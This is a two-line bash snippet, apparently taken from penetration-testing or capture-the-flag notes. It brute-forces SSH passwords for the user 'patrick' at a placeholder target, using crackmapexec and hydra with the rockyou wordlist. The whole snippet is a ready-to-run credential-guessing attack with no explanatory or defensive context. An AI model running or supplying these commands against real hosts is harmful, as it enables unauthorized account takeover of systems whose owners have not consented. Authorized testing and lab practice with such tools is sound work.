```bash
crackmapexec ssh <target_ip> -u patrick -p /usr/share/wordlists/rockyou.txt

hydra -l patrick -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

```